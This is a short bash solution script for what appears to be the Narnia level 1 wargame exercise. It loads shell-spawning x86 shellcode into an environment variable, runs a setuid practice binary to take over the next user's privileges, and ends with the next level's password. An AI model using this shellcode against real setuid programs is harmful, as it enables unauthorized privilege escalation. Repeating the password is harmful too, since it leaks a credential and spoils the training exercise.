#!usr/bin/bash

export EGG=$(echo -e "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80")

./narnia1

# Things might behave weirdly sometimes. Inspite of the shellcode specifically ensuring that the spawned shell maintains the privileges of the owner 
# of the binary, it might still spawn a shell with narnia1 as the user, instead of narnia2
# In such cases, just quit the ssh session and login again with a new session and try setting the environment variable again, it most probably
# will work correctly!


# Narnia2 password at the time of solving - Zzb6MIyceT
